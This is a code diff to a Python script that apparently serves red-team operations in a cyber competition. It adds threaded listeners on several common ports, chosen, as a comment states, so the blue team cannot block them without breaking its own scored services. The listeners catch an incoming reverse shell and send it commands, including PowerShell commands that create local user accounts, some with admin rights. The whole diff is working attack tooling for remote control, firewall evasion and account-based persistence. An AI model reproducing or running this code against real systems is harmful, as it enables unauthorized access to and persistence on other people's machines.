@@ -4,10 +4,9 @@ import random
 import threading
 import argparse
 
-HOST = "0.0.0.0"
-PORT = 4444
+# Ports blue team can't block without killing their own scored services come first
+PORTS = [80, 443, 8080, 3306, 4444, 5985, 8443]
 
-# Pool of names per team
 NAME_POOLS = {
     "USA": [
         "james_brooks", "michael_reed", "david_lane", "robert_hayes",
@@ -25,6 +24,10 @@ NAME_POOLS = {
     ]
 }
 
+# Shared connection object accessible across threads
+active_conn = None
+active_conn_lock = threading.Lock()
+
 def send_command(conn, command):
     conn.send((command + "\n").encode("utf-8"))
     time.sleep(3)
@@ -39,6 +42,52 @@ def send_command(conn, command):
     except socket.timeout:
         pass
     return response.decode("utf-8", errors="ignore")
+
+# Spin up a listener on a single port, wait for a connection, and store it in result_holder if it's the first one
+def listen_on_port(port, result_holder):
+    try:
+        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        server.bind(("0.0.0.0", port))
+        server.listen(1)
+        server.settimeout(300)  # wait up to 5 min per port
+        print(f"[*] Listening on port {port}...")
+        conn, addr = server.accept()
+
+        with active_conn_lock:
+            if result_holder["conn"] is None:
+                result_holder["conn"] = conn
+                result_holder["port"] = port
+                result_holder["addr"] = addr[0]
+                print(f"\n[+] Connection from {addr[0]} on port {port}")
+    except Exception:
+        pass
+    finally:
+        try:
+            server.close()
+        except Exception:
+            pass
+
+# Spawns a listener thread for every port simultaneously
+def wait_for_connection():
+    result_holder = {"conn": None, "port": None, "addr": None}
+    threads = []
+
+    for port in PORTS:
+        t = threading.Thread(
+            target=listen_on_port,
+            args=(port, result_holder),
+            daemon=True
+        )
+        t.start()
+        threads.append(t)
+
+    # Wait until one connection is established
+    print(f"[*] Listening on {len(PORTS)} ports simultaneously: {PORTS}")
+    while result_holder["conn"] is None:
+        time.sleep(0.5)
+
+    return result_holder["conn"], result_holder["port"]
 
 # Powershell command to create a local user 
 def make_user_command(username, admin=False):
